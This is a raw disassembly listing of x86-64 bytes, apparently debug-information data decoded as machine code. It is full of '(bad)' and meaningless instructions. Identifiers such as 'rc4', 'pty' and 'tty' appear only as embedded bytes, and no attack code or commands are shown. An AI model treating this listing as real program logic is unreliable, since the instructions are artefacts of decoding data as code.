     597:	00 19                	add    %bl,(%rcx)
     599:	dd 11                	fstl   (%rcx)
     59b:	40 00 00             	add    %al,(%rax)
     59e:	00 00                	add    %al,(%rax)
     5a0:	00 53 00             	add    %dl,0x0(%rbx)
     5a3:	00 00                	add    %al,(%rax)
     5a5:	00 00                	add    %al,(%rax)
     5a7:	00 00                	add    %al,(%rax)
     5a9:	17                   	(bad)  
     5aa:	73 74                	jae    620 <_init-0x400778>
     5ac:	72 00                	jb     5ae <_init-0x4007ea>
     5ae:	01 3f                	add    %edi,(%rdi)
     5b0:	d5                   	(bad)  
     5b1:	05 00 00 03 91       	add    $0x91030000,%eax
     5b6:	90                   	nop
     5b7:	7f 00                	jg     5b9 <_init-0x4007df>
     5b9:	00 05 08 f2 04 00    	add    %al,0x4f208(%rip)        # 4f7c7 <_init-0x3b15d1>
     5bf:	00 09                	add    %cl,(%rcx)
     5c1:	88 00                	mov    %al,(%rax)
     5c3:	00 00                	add    %al,(%rax)
     5c5:	d0 05 00 00 0a 65    	rolb   0x650a0000(%rip)        # 650a05cb <_end+0x64a973db>
     5cb:	00 00                	add    %al,(%rax)
     5cd:	00 0e                	add    %cl,(%rsi)
     5cf:	00 1a                	add    %bl,(%rdx)
     5d1:	c0 05 00 00 09 88 00 	rolb   $0x0,-0x77f70000(%rip)        # ffffffff880905d8 <_end+0xffffffff87a873e8>
     5d8:	00 00                	add    %al,(%rax)
     5da:	e5 05                	in     $0x5,%eax
     5dc:	00 00                	add    %al,(%rax)
     5de:	0a 65 00             	or     0x0(%rbp),%ah
     5e1:	00 00                	add    %al,(%rax)
     5e3:	08 00                	or     %al,(%rax)
     5e5:	1b 06                	sbb    (%rsi),%eax
     5e7:	04 00                	add    $0x0,%al
     5e9:	00 01                	add    %al,(%rcx)
     5eb:	54                   	push   %rsp
     5ec:	d0 12                	rclb   (%rdx)
     5ee:	40 00 00             	add    %al,(%rax)
     5f1:	00 00                	add    %al,(%rax)
     5f3:	00 28                	add    %ch,(%rax)
     5f5:	00 00                	add    %al,(%rax)
     5f7:	00 00                	add    %al,(%rax)
     5f9:	00 00                	add    %al,(%rax)
     5fb:	00 01                	add    %al,(%rcx)
     5fd:	9c                   	pushfq 
     5fe:	10 06                	adc    %al,(%rsi)
     600:	00 00                	add    %al,(%rax)
     602:	15 73 64 00 01       	adc    $0x1006473,%eax
     607:	54                   	push   %rsp
     608:	ba 05 00 00 02       	mov    $0x2000005,%edx
     60d:	91                   	xchg   %eax,%ecx
     60e:	68 00 14 8f 03       	pushq  $0x38f1400
     613:	00 00                	add    %al,(%rax)
     615:	01 58 57             	add    %ebx,0x57(%rax)
     618:	00 00                	add    %al,(%rax)
     61a:	00 f8                	add    %bh,%al
     61c:	12 40 00             	adc    0x0(%rax),%al
     61f:	00 00                	add    %al,(%rax)
     621:	00 00                	add    %al,(%rax)
     623:	f0 00 00             	lock add %al,(%rax)
     626:	00 00                	add    %al,(%rax)
     628:	00 00                	add    %al,(%rax)
     62a:	00 01                	add    %al,(%rcx)
     62c:	9c                   	pushfq 
     62d:	72 06                	jb     635 <_init-0x400763>
     62f:	00 00                	add    %al,(%rax)
     631:	15 63 64 00 01       	adc    $0x1006463,%eax
     636:	58                   	pop    %rax
     637:	72 06                	jb     63f <_init-0x400759>
     639:	00 00                	add    %al,(%rax)
     63b:	02 91 48 18 06 02    	add    0x2061848(%rcx),%dl
     641:	00 00                	add    %al,(%rax)
     643:	88 06                	mov    %al,(%rsi)
     645:	00 00                	add    %al,(%rax)
     647:	09 03                	or     %eax,(%rbx)
     649:	60                   	(bad)  
     64a:	7b 40                	jnp    68c <_init-0x40070c>
     64c:	00 00                	add    %al,(%rax)
     64e:	00 00                	add    %al,(%rax)
     650:	00 19                	add    %bl,(%rcx)
     652:	37                   	(bad)  
     653:	13 40 00             	adc    0x0(%rax),%eax
     656:	00 00                	add    %al,(%rax)
     658:	00 00                	add    %al,(%rax)
     65a:	53                   	push   %rbx
     65b:	00 00                	add    %al,(%rax)
     65d:	00 00                	add    %al,(%rax)
     65f:	00 00                	add    %al,(%rax)
     661:	00 17                	add    %dl,(%rdi)
     663:	73 74                	jae    6d9 <_init-0x4006bf>
     665:	72 00                	jb     667 <_init-0x400731>
     667:	01 5b d5             	add    %ebx,-0x2b(%rbx)
     66a:	05 00 00 02 91       	add    $0x91020000,%eax
     66f:	50                   	push   %rax
     670:	00 00                	add    %al,(%rax)
     672:	05 08 6f 04 00       	add    $0x46f08,%eax
     677:	00 09                	add    %cl,(%rcx)
     679:	88 00                	mov    %al,(%rax)
     67b:	00 00                	add    %al,(%rax)
     67d:	88 06                	mov    %al,(%rsi)
     67f:	00 00                	add    %al,(%rax)
     681:	0a 65 00             	or     0x0(%rbp),%ah
     684:	00 00                	add    %al,(%rax)
     686:	18 00                	sbb    %al,(%rax)
     688:	1a 78 06             	sbb    0x6(%rax),%bh
     68b:	00 00                	add    %al,(%rax)
     68d:	14 4c                	adc    $0x4c,%al
     68f:	05 00 00 01 67       	add    $0x67010000,%eax
     694:	57                   	push   %rdi
     695:	00 00                	add    %al,(%rax)
     697:	00 e8                	add    %ch,%al
     699:	13 40 00             	adc    0x0(%rax),%eax
     69c:	00 00                	add    %al,(%rax)
     69e:	00 00                	add    %al,(%rax)
     6a0:	b4 01                	mov    $0x1,%ah
     6a2:	00 00                	add    %al,(%rax)
     6a4:	00 00                	add    %al,(%rax)
     6a6:	00 00                	add    %al,(%rax)
     6a8:	01 9c 65 07 00 00 13 	add    %ebx,0x13000007(%rbp,%riz,2)
     6af:	15 05 00 00 01       	adc    $0x1000005,%eax
     6b4:	67 57                	addr32 push %rdi
     6b6:	00 00                	add    %al,(%rax)
     6b8:	00 03                	add    %al,(%rbx)
     6ba:	91                   	xchg   %eax,%ecx
     6bb:	9c                   	pushfq 
     6bc:	7f 13                	jg     6d1 <_init-0x4006c7>
     6be:	dc 04 00             	faddl  (%rax,%rax,1)
     6c1:	00 01                	add    %al,(%rcx)
     6c3:	67 98                	addr32 cwtl 
     6c5:	03 00                	add    (%rax),%eax
     6c7:	00 03                	add    %al,(%rbx)
     6c9:	91                   	xchg   %eax,%ecx
     6ca:	90                   	nop
     6cb:	7f 13                	jg     6e0 <_init-0x4006b8>
     6cd:	51                   	push   %rcx
     6ce:	01 00                	add    %eax,(%rax)
     6d0:	00 01                	add    %al,(%rcx)
     6d2:	68 82 00 00 00       	pushq  $0x82
     6d7:	03 91 88 7f 13 59    	add    0x59137f88(%rcx),%edx
     6dd:	01 00                	add    %eax,(%rax)
     6df:	00 01                	add    %al,(%rcx)
     6e1:	68 57 00 00 00       	pushq  $0x57
     6e6:	03 91 98 7f 17 69    	add    0x69177f98(%rcx),%edx
     6ec:	00 01                	add    %al,(%rcx)
     6ee:	6a 57                	pushq  $0x57
     6f0:	00 00                	add    %al,(%rax)
     6f2:	00 03                	add    %al,(%rbx)
     6f4:	91                   	xchg   %eax,%ecx
     6f5:	b4 7f                	mov    $0x7f,%ah
     6f7:	16                   	(bad)  
     6f8:	d4                   	(bad)  
     6f9:	01 00                	add    %eax,(%rax)
     6fb:	00 01                	add    %al,(%rcx)
     6fd:	6b 57 00 00          	imul   $0x0,0x0(%rdi),%edx
     701:	00 03                	add    %al,(%rbx)
     703:	91                   	xchg   %eax,%ecx
     704:	ac                   	lods   %ds:(%rsi),%al
     705:	7f 16                	jg     71d <_init-0x40067b>
     707:	42 04 00             	rex.X add $0x0,%al
     70a:	00 01                	add    %al,(%rcx)
     70c:	6c                   	insb   (%dx),%es:(%rdi)
     70d:	82                   	(bad)  
     70e:	00 00                	add    %al,(%rax)
     710:	00 03                	add    %al,(%rbx)
     712:	91                   	xchg   %eax,%ecx
     713:	b8 7f 17 6e 00       	mov    $0x6e177f,%eax
     718:	01 6d 57             	add    %ebp,0x57(%rbp)
     71b:	00 00                	add    %al,(%rax)
     71d:	00 03                	add    %al,(%rbx)
     71f:	91                   	xchg   %eax,%ecx
     720:	b0 7f                	mov    $0x7f,%al
     722:	1c d0                	sbb    $0xd0,%al
     724:	03 00                	add    (%rax),%eax
     726:	00 01                	add    %al,(%rcx)
     728:	87 25 15 40 00 00    	xchg   %esp,0x4015(%rip)        # 4743 <_init-0x3fc655>
     72e:	00 00                	add    %al,(%rax)
     730:	00 18                	add    %bl,(%rax)
     732:	06                   	(bad)  
     733:	02 00                	add    (%rax),%al
     735:	00 75 07             	add    %dh,0x7(%rbp)
     738:	00 00                	add    %al,(%rax)
     73a:	09 03                	or     %eax,(%rbx)
     73c:	80 7b 40 00          	cmpb   $0x0,0x40(%rbx)
     740:	00 00                	add    %al,(%rax)
     742:	00 00                	add    %al,(%rax)
     744:	19 25 15 40 00 00    	sbb    %esp,0x4015(%rip)        # 475f <_init-0x3fc639>
     74a:	00 00                	add    %al,(%rax)
     74c:	00 57 00             	add    %dl,0x0(%rdi)
     74f:	00 00                	add    %al,(%rax)
     751:	00 00                	add    %al,(%rax)
     753:	00 00                	add    %al,(%rax)
     755:	17                   	(bad)  
     756:	73 74                	jae    7cc <_init-0x4005cc>
     758:	72 00                	jb     75a <_init-0x40063e>
     75a:	01 88 d5 05 00 00    	add    %ecx,0x5d5(%rax)
     760:	02 91 40 00 00 09    	add    0x9000040(%rcx),%dl
     766:	88 00                	mov    %al,(%rax)
     768:	00 00                	add    %al,(%rax)
     76a:	75 07                	jne    773 <_init-0x400625>
     76c:	00 00                	add    %al,(%rax)
     76e:	0a 65 00             	or     0x0(%rbp),%ah
     771:	00 00                	add    %al,(%rax)
     773:	19 00                	sbb    %eax,(%rax)
     775:	1a 65 07             	sbb    0x7(%rbp),%ah
     778:	00 00                	add    %al,(%rax)
     77a:	14 ba                	adc    $0xba,%al
     77c:	01 00                	add    %eax,(%rax)
     77e:	00 01                	add    %al,(%rcx)
     780:	8d 57 00             	lea    0x0(%rdi),%edx
     783:	00 00                	add    %al,(%rax)
     785:	9c                   	pushfq 
     786:	15 40 00 00 00       	adc    $0x40,%eax
     78b:	00 00                	add    %al,(%rax)
     78d:	91                   	xchg   %eax,%ecx
     78e:	0b 00                	or     (%rax),%eax
     790:	00 00                	add    %al,(%rax)
     792:	00 00                	add    %al,(%rax)
     794:	00 01                	add    %al,(%rcx)
     796:	9c                   	pushfq 
     797:	cc                   	int3   
     798:	08 00                	or     %al,(%rax)
     79a:	00 15 63 64 00 01    	add    %dl,0x1006463(%rip)        # 1006c03 <_end+0x9fda13>
     7a0:	8d 72 06             	lea    0x6(%rdx),%esi
     7a3:	00 00                	add    %al,(%rax)
     7a5:	04 91                	add    $0x91,%al
     7a7:	a8 b4                	test   $0xb4,%al
     7a9:	7f 15                	jg     7c0 <_init-0x4005d8>
     7ab:	73 64                	jae    811 <_init-0x400587>
     7ad:	00 01                	add    %al,(%rcx)
     7af:	8d ba 05 00 00 04    	lea    0x4000005(%rdx),%edi
     7b5:	91                   	xchg   %eax,%ecx
     7b6:	a0 b4 7f 17 69 00 01 	movabs 0x578e010069177fb4,%al
     7bd:	8e 57 
     7bf:	00 00                	add    %al,(%rax)
     7c1:	00 04 91             	add    %al,(%rcx,%rdx,4)
     7c4:	b0 b4                	mov    $0xb4,%al
     7c6:	7f 17                	jg     7df <_init-0x4005b9>
     7c8:	6a 00                	pushq  $0x0
     7ca:	01 8e 57 00 00 00    	add    %ecx,0x57(%rsi)
     7d0:	04 91                	add    $0x91,%al
     7d2:	b4 b4                	mov    $0xb4,%ah
     7d4:	7f 17                	jg     7ed <_init-0x4005ab>
     7d6:	6c                   	insb   (%dx),%es:(%rdi)
     7d7:	65 6e                	outsb  %gs:(%rsi),(%dx)
     7d9:	00 01                	add    %al,(%rcx)
     7db:	8e 57 00             	mov    0x0(%rdi),%ss
     7de:	00 00                	add    %al,(%rax)
     7e0:	04 91                	add    $0x91,%al
     7e2:	c0                   	(bad)  
     7e3:	b4 7f                	mov    $0x7f,%ah
     7e5:	16                   	(bad)  
     7e6:	fa                   	cli    
     7e7:	00 00                	add    %al,(%rax)
     7e9:	00 01                	add    %al,(%rcx)
     7eb:	8f                   	(bad)  
     7ec:	37                   	(bad)  
     7ed:	04 00                	add    $0x0,%al
     7ef:	00 04 91             	add    %al,(%rcx,%rdx,4)
     7f2:	b0 bd                	mov    $0xbd,%al
     7f4:	7f 17                	jg     80d <_init-0x40058b>
     7f6:	72 63                	jb     85b <_init-0x40053d>
     7f8:	34 00                	xor    $0x0,%al
     7fa:	01 90 9e 03 00 00    	add    %edx,0x39e(%rax)
     800:	04 91                	add    $0x91,%al
     802:	d0                   	(bad)  
     803:	b4 7f                	mov    $0x7f,%ah
     805:	16                   	(bad)  
     806:	84 05 00 00 01 91    	test   %al,-0x6eff0000(%rip)        # ffffffff9101080c <_end+0xffffffff90a0761c>
     80c:	cc                   	int3   
     80d:	08 00                	or     %al,(%rax)
     80f:	00 04 91             	add    %al,(%rcx,%rdx,4)
     812:	90                   	nop
     813:	bd 7f 17 6d 73       	mov    $0x736d177f,%ebp
     818:	67 00 01             	add    %al,(%ecx)
     81b:	92                   	xchg   %eax,%edx
     81c:	dc 08                	fmull  (%rax)
     81e:	00 00                	add    %al,(%rax)
     820:	04 91                	add    $0x91,%al
     822:	b0 be                	mov    $0xbe,%al
     824:	7f 16                	jg     83c <_init-0x40055c>
     826:	a9 02 00 00 01       	test   $0x1000002,%eax
     82b:	93                   	xchg   %eax,%ebx
     82c:	57                   	push   %rdi
     82d:	00 00                	add    %al,(%rax)
     82f:	00 04 91             	add    %al,(%rcx,%rdx,4)
     832:	b8 b4 7f 16 47       	mov    $0x47167fb4,%eax
     837:	02 00                	add    (%rax),%al
     839:	00 01                	add    %al,(%rcx)
     83b:	94                   	xchg   %eax,%esp
     83c:	57                   	push   %rdi
     83d:	00 00                	add    %al,(%rax)
     83f:	00 04 91             	add    %al,(%rcx,%rdx,4)
     842:	bc b4 7f 18 06       	mov    $0x6187fb4,%esp
     847:	02 00                	add    (%rax),%al
     849:	00 fd                	add    %bh,%ch
     84b:	08 00                	or     %al,(%rax)
     84d:	00 09                	add    %cl,(%rcx)
     84f:	03 a0 7b 40 00 00    	add    0x407b(%rax),%esp
     855:	00 00                	add    %al,(%rax)
     857:	00 19                	add    %bl,(%rcx)
     859:	e8 15 40 00 00       	callq  4873 <_init-0x3fc525>
     85e:	00 00                	add    %al,(%rax)
     860:	00 07                	add    %al,(%rdi)
     862:	0b 00                	or     (%rax),%eax
     864:	00 00                	add    %al,(%rax)
     866:	00 00                	add    %al,(%rax)
     868:	00 16                	add    %dl,(%rsi)
     86a:	f2 00 00             	repnz add %al,(%rax)
     86d:	00 01                	add    %al,(%rcx)
     86f:	cc                   	int3   
     870:	02 09                	add    (%rcx),%cl
     872:	00 00                	add    %al,(%rax)
     874:	04 91                	add    $0x91,%al
     876:	f0 bc 7f 17 74 73    	lock mov $0x7374177f,%esp
     87c:	64 00 01             	add    %al,%fs:(%rcx)
     87f:	cd f2                	int    $0xf2
     881:	04 00                	add    $0x0,%al
     883:	00 03                	add    %al,(%rbx)
     885:	91                   	xchg   %eax,%ecx
     886:	f0 5e                	lock pop %rsi
     888:	16                   	(bad)  
     889:	cb                   	lret   
     88a:	01 00                	add    %eax,(%rax)
     88c:	00 01                	add    %al,(%rcx)
     88e:	ce                   	(bad)  
     88f:	57                   	push   %rdi
     890:	00 00                	add    %al,(%rax)
     892:	00 04 91             	add    %al,(%rcx,%rdx,4)
     895:	c4                   	(bad)  
     896:	b4 7f                	mov    $0x7f,%ah
     898:	16                   	(bad)  
     899:	1d 05 00 00 01       	sbb    $0x1000005,%eax
     89e:	cf                   	iret   
     89f:	12 09                	adc    (%rcx),%cl
     8a1:	00 00                	add    %al,(%rax)
     8a3:	04 91                	add    $0x91,%al
     8a5:	c8 b4 7f 19          	enterq $0x7fb4,$0x19
     8a9:	21 1d 40 00 00 00    	and    %ebx,0x40(%rip)        # 8ef <_init-0x4004a9>
     8af:	00 00                	add    %al,(%rax)
     8b1:	4b 00 00             	rex.WXB add %al,(%r8)
     8b4:	00 00                	add    %al,(%rax)
     8b6:	00 00                	add    %al,(%rax)
     8b8:	00 17                	add    %dl,(%rdi)
     8ba:	73 74                	jae    930 <_init-0x400468>
     8bc:	72 00                	jb     8be <_init-0x4004da>
     8be:	01 ed                	add    %ebp,%ebp
     8c0:	d5                   	(bad)  
     8c1:	05 00 00 04 91       	add    $0x91040000,%eax
     8c6:	e0 bc                	loopne 884 <_init-0x400514>
     8c8:	7f 00                	jg     8ca <_init-0x4004ce>
     8ca:	00 00                	add    %al,(%rax)
     8cc:	09 2d 00 00 00 dc    	or     %ebp,-0x24000000(%rip)        # ffffffffdc0008d2 <_end+0xffffffffdb9f76e2>
     8d2:	08 00                	or     %al,(%rax)
     8d4:	00 0a                	add    %cl,(%rdx)
     8d6:	65 00 00             	add    %al,%gs:(%rax)
     8d9:	00 1f                	add    %bl,(%rdi)
     8db:	00 09                	add    %cl,(%rcx)
     8dd:	2d 00 00 00 ed       	sub    $0xed000000,%eax
     8e2:	08 00                	or     %al,(%rax)
     8e4:	00 11                	add    %dl,(%rcx)
     8e6:	65 00 00             	add    %al,%gs:(%rax)
     8e9:	00 3f                	add    %bh,(%rdi)
     8eb:	10 00                	adc    %al,(%rax)
     8ed:	09 88 00 00 00 fd    	or     %ecx,-0x3000000(%rax)
     8f3:	08 00                	or     %al,(%rax)
     8f5:	00 0a                	add    %cl,(%rdx)
     8f7:	65 00 00             	add    %al,%gs:(%rax)
     8fa:	00 10                	add    %dl,(%rax)
     8fc:	00 1a                	add    %bl,(%rdx)
     8fe:	ed                   	in     (%dx),%eax
     8ff:	08 00                	or     %al,(%rax)
     901:	00 09                	add    %cl,(%rcx)
     903:	2d 00 00 00 12       	sub    $0x12000000,%eax
     908:	09 00                	or     %eax,(%rax)
     90a:	00 0a                	add    %cl,(%rdx)
     90c:	65 00 00             	add    %al,%gs:(%rax)
     90f:	00 13                	add    %dl,(%rbx)
     911:	00 05 08 2d 00 00    	add    %al,0x2d08(%rip)        # 361f <_init-0x3fd779>
     917:	00 1d 47 05 00 00    	add    %bl,0x547(%rip)        # e64 <_init-0x3fff34>
     91d:	01 16                	add    %edx,(%rsi)
     91f:	01 57 00             	add    %edx,0x0(%rdi)
     922:	00 00                	add    %al,(%rax)
     924:	2d 21 40 00 00       	sub    $0x4021,%eax
     929:	00 00                	add    %al,(%rax)
     92b:	00 5d 0a             	add    %bl,0xa(%rbp)
     92e:	00 00                	add    %al,(%rax)
     930:	00 00                	add    %al,(%rax)
     932:	00 00                	add    %al,(%rax)
     934:	01 9c e7 0b 00 00 1e 	add    %ebx,0x1e00000b(%rdi,%riz,8)
     93b:	15 05 00 00 01       	adc    $0x1000005,%eax
     940:	16                   	(bad)  
     941:	01 57 00             	add    %edx,0x0(%rdi)
     944:	00 00                	add    %al,(%rax)
     946:	03 91 9c 5b 1e dc    	add    -0x23e1a464(%rcx),%edx
     94c:	04 00                	add    $0x0,%al
     94e:	00 01                	add    %al,(%rcx)
     950:	16                   	(bad)  
     951:	01 98 03 00 00 03    	add    %ebx,0x3000003(%rax)
     957:	91                   	xchg   %eax,%ecx
     958:	90                   	nop
     959:	5b                   	pop    %rbx
     95a:	1f                   	(bad)  
     95b:	0e                   	(bad)  
     95c:	01 00                	add    %eax,(%rax)
     95e:	00 01                	add    %al,(%rcx)
     960:	18 01                	sbb    %al,(%rcx)
     962:	e7 0b                	out    %eax,$0xb
     964:	00 00                	add    %al,(%rax)
     966:	03 91 80 5d 1f b4    	add    -0x4be0a280(%rcx),%edx
     96c:	01 00                	add    %eax,(%rax)
     96e:	00 01                	add    %al,(%rcx)
     970:	18 01                	sbb    %al,(%rcx)
     972:	82                   	(bad)  
     973:	00 00                	add    %al,(%rax)
     975:	00 03                	add    %al,(%rbx)
     977:	91                   	xchg   %eax,%ecx
     978:	c8 5b 20 69          	enterq $0x205b,$0x69
     97c:	00 01                	add    %al,(%rcx)
     97e:	19 01                	sbb    %eax,(%rcx)
     980:	57                   	push   %rdi
     981:	00 00                	add    %al,(%rax)
     983:	00 03                	add    %al,(%rbx)
     985:	91                   	xchg   %eax,%ecx
     986:	b4 5b                	mov    $0x5b,%ah
     988:	20 70 74             	and    %dh,0x74(%rax)
     98b:	79 00                	jns    98d <_init-0x40040b>
     98d:	01 19                	add    %ebx,(%rcx)
     98f:	01 57 00             	add    %edx,0x0(%rdi)
     992:	00 00                	add    %al,(%rax)
     994:	03 91 ac 5b 20 74    	add    0x74205bac(%rcx),%edx
     99a:	74 79                	je     a15 <_init-0x400383>
     99c:	00 01                	add    %al,(%rcx)
     99e:	19 01                	sbb    %eax,(%rcx)
     9a0:	57                   	push   %rdi
     9a1:	00 00                	add    %al,(%rax)
     9a3:	00 03                	add    %al,(%rbx)
     9a5:	91                   	xchg   %eax,%ecx
     9a6:	b0 5b                	mov    $0x5b,%al
     9a8:	20 72 65             	and    %dh,0x65(%rdx)
     9ab:	74 00                	je     9ad <_init-0x4003eb>
     9ad:	01 1a                	add    %ebx,(%rdx)
     9af:	01 57 00             	add    %edx,0x0(%rdi)
     9b2:	00 00                	add    %al,(%rax)
     9b4:	03 91 b8 5b 20 73    	add    0x73205bb8(%rcx),%edx
     9ba:	64 00 01             	add    %al,%fs:(%rcx)
     9bd:	1b 01                	sbb    (%rcx),%eax
     9bf:	f2 04 00             	repnz add $0x0,%al
     9c2:	00 03                	add    %al,(%rbx)
     9c4:	91                   	xchg   %eax,%ecx
     9c5:	80 5f 20 63          	sbbb   $0x63,0x20(%rdi)
     9c9:	64 00 01             	add    %al,%fs:(%rcx)
     9cc:	1c 01                	sbb    $0x1,%al
     9ce:	6f                   	outsl  %ds:(%rsi),(%dx)
     9cf:	04 00                	add    $0x0,%al
     9d1:	00 03                	add    %al,(%rbx)
     9d3:	91                   	xchg   %eax,%ecx
     9d4:	e0 5c                	loopne a32 <_init-0x400366>
     9d6:	20 72 64             	and    %dh,0x64(%rdx)
     9d9:	00 01                	add    %al,(%rcx)
     9db:	1d 01 e4 00 00       	sbb    $0xe401,%eax
     9e0:	00 03                	add    %al,(%rbx)
     9e2:	91                   	xchg   %eax,%ecx
     9e3:	d0 5b 18             	rcrb   0x18(%rbx)
     9e6:	06                   	(bad)  
     9e7:	02 00                	add    (%rax),%al
     9e9:	00 07                	add    %al,(%rdi)
     9eb:	0c 00                	or     $0x0,%al
     9ed:	00 09                	add    %cl,(%rcx)
     9ef:	03 b1 7b 40 00 00    	add    0x407b(%rcx),%esi
     9f5:	00 00                	add    %al,(%rax)
     9f7:	00 21                	add    %ah,(%rcx)
     9f9:	09 01                	or     %eax,(%rcx)
     9fb:	00 00                	add    %al,(%rax)
     9fd:	01 e4                	add    %esp,%esp
     9ff:	01 22                	add    %esp,(%rdx)
     a01:	2b 40 00             	sub    0x0(%rax),%eax
     a04:	00 00                	add    %al,(%rax)
     a06:	00 00                	add    %al,(%rax)
     a08:	21 e9                	and    %ebp,%ecx
     a0a:	03 00                	add    (%rax),%eax
     a0c:	00 01                	add    %al,(%rcx)
     a0e:	cf                   	iret   
     a0f:	01 95 2a 40 00 00    	add    %edx,0x402a(%rbp)
     a15:	00 00                	add    %al,(%rax)
     a17:	00 22                	add    %ah,(%rdx)
     a19:	b9 21 40 00 00       	mov    $0x4021,%ecx
     a1e:	00 00                	add    %al,(%rax)
     a20:	00 4b 00             	add    %cl,0x0(%rbx)
     a23:	00 00                	add    %al,(%rax)
     a25:	00 00                	add    %al,(%rax)
     a27:	00 00                	add    %al,(%rax)
     a29:	3e 0a 00             	or     %ds:(%rax),%al
     a2c:	00 20                	add    %ah,(%rax)
     a2e:	73 74                	jae    aa4 <_init-0x4002f4>
     a30:	72 00                	jb     a32 <_init-0x400366>
     a32:	01 25 01 d5 05 00    	add    %esp,0x5d501(%rip)        # 5df39 <_init-0x3a2e5f>
     a38:	00 03                	add    %al,(%rbx)
     a3a:	91                   	xchg   %eax,%ecx
     a3b:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     a3f:	09 22                	or     %esp,(%rdx)
     a41:	40 00 00             	add    %al,(%rax)
     a44:	00 00                	add    %al,(%rax)
     a46:	00 5a 00             	add    %bl,0x0(%rdx)
     a49:	00 00                	add    %al,(%rax)
     a4b:	00 00                	add    %al,(%rax)
     a4d:	00 00                	add    %al,(%rax)
     a4f:	64 0a 00             	or     %fs:(%rax),%al
     a52:	00 20                	add    %ah,(%rax)
     a54:	73 74                	jae    aca <_init-0x4002ce>
     a56:	72 00                	jb     a58 <_init-0x400340>
     a58:	01 29                	add    %ebp,(%rcx)
     a5a:	01 d5                	add    %edx,%ebp
     a5c:	05 00 00 03 91       	add    $0x91030000,%eax
     a61:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     a65:	97                   	xchg   %eax,%edi
     a66:	22 40 00             	and    0x0(%rax),%al
     a69:	00 00                	add    %al,(%rax)
     a6b:	00 00                	add    %al,(%rax)
     a6d:	4b 00 00             	rex.WXB add %al,(%r8)
     a70:	00 00                	add    %al,(%rax)
     a72:	00 00                	add    %al,(%rax)
     a74:	00 8a 0a 00 00 20    	add    %cl,0x2000000a(%rdx)
     a7a:	73 74                	jae    af0 <_init-0x4002a8>
     a7c:	72 00                	jb     a7e <_init-0x40031a>
     a7e:	01 30                	add    %esi,(%rax)
     a80:	01 d5                	add    %edx,%ebp
     a82:	05 00 00 03 91       	add    $0x91030000,%eax
     a87:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     a8b:	05 23 40 00 00       	add    $0x4023,%eax
     a90:	00 00                	add    %al,(%rax)
     a92:	00 4b 00             	add    %cl,0x0(%rbx)
     a95:	00 00                	add    %al,(%rax)
     a97:	00 00                	add    %al,(%rax)
     a99:	00 00                	add    %al,(%rax)
     a9b:	b0 0a                	mov    $0xa,%al
     a9d:	00 00                	add    %al,(%rax)
     a9f:	20 73 74             	and    %dh,0x74(%rbx)
     aa2:	72 00                	jb     aa4 <_init-0x4002f4>
     aa4:	01 36                	add    %esi,(%rsi)
     aa6:	01 d5                	add    %edx,%ebp
     aa8:	05 00 00 03 91       	add    $0x91030000,%eax
     aad:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     ab1:	7f 23                	jg     ad6 <_init-0x4002c2>
     ab3:	40 00 00             	add    %al,(%rax)
     ab6:	00 00                	add    %al,(%rax)
     ab8:	00 59 00             	add    %bl,0x0(%rcx)
     abb:	00 00                	add    %al,(%rax)
     abd:	00 00                	add    %al,(%rax)
     abf:	00 00                	add    %al,(%rax)
     ac1:	d6                   	(bad)  
     ac2:	0a 00                	or     (%rax),%al
     ac4:	00 20                	add    %ah,(%rax)
     ac6:	73 74                	jae    b3c <_init-0x40025c>
     ac8:	72 00                	jb     aca <_init-0x4002ce>
     aca:	01 3d 01 d5 05 00    	add    %edi,0x5d501(%rip)        # 5dfd1 <_init-0x3a2dc7>
     ad0:	00 03                	add    %al,(%rbx)
     ad2:	91                   	xchg   %eax,%ecx
     ad3:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     ad7:	fb                   	sti    
     ad8:	23 40 00             	and    0x0(%rax),%eax
     adb:	00 00                	add    %al,(%rax)
     add:	00 00                	add    %al,(%rax)
     adf:	59                   	pop    %rcx
     ae0:	00 00                	add    %al,(%rax)
     ae2:	00 00                	add    %al,(%rax)
     ae4:	00 00                	add    %al,(%rax)
     ae6:	00 fc                	add    %bh,%ah
     ae8:	0a 00                	or     (%rax),%al
     aea:	00 20                	add    %ah,(%rax)
     aec:	73 74                	jae    b62 <_init-0x400236>
     aee:	72 00                	jb     af0 <_init-0x4002a8>
     af0:	01 42 01             	add    %eax,0x1(%rdx)
     af3:	d5                   	(bad)  
     af4:	05 00 00 03 91       	add    $0x91030000,%eax
     af9:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     afd:	59                   	pop    %rcx
     afe:	24 40                	and    $0x40,%al
     b00:	00 00                	add    %al,(%rax)
     b02:	00 00                	add    %al,(%rax)
     b04:	00 5a 00             	add    %bl,0x0(%rdx)
     b07:	00 00                	add    %al,(%rax)
     b09:	00 00                	add    %al,(%rax)
     b0b:	00 00                	add    %al,(%rax)
     b0d:	22 0b                	and    (%rbx),%cl
     b0f:	00 00                	add    %al,(%rax)
     b11:	20 73 74             	and    %dh,0x74(%rbx)
     b14:	72 00                	jb     b16 <_init-0x400282>
     b16:	01 45 01             	add    %eax,0x1(%rbp)
     b19:	d5                   	(bad)  
     b1a:	05 00 00 03 91       	add    $0x91030000,%eax
     b1f:	80 5f 00 22          	sbbb   $0x22,0x0(%rdi)
     b23:	d9 24 40             	fldenv (%rax,%rax,2)
     b26:	00 00                	add    %al,(%rax)
     b28:	00 00                	add    %al,(%rax)
     b2a:	00 4b 00             	add    %cl,0x0(%rbx)
     b2d:	00 00                	add    %al,(%rax)
     b2f:	00 00                	add    %al,(%rax)
     b31:	00 00                	add    %al,(%rax)
     b33:	48 0b 00             	or     (%rax),%rax
     b36:	00 20                	add    %ah,(%rax)
     b38:	73 74                	jae    bae <_init-0x4001ea>
     b3a:	72 00                	jb     b3c <_init-0x40025c>
     b3c:	01 49 01             	add    %ecx,0x1(%rcx)
     b3f:	d5                   	(bad)  
     b40:	05 00 00 03 91       	add    $0x91030000,%eax
     b45:	d0 5c 00 22          	rcrb   0x22(%rax,%rax,1)
     b49:	b9 25 40 00 00       	mov    $0x4025,%ecx
     b4e:	00 00                	add    %al,(%rax)
     b50:	00 59 00             	add    %bl,0x0(%rcx)
     b53:	00 00                	add    %al,(%rax)
     b55:	00 00                	add    %al,(%rax)
     b57:	00 00                	add    %al,(%rax)
     b59:	6e                   	outsb  %ds:(%rsi),(%dx)
     b5a:	0b 00                	or     (%rax),%eax
     b5c:	00 20                	add    %ah,(%rax)
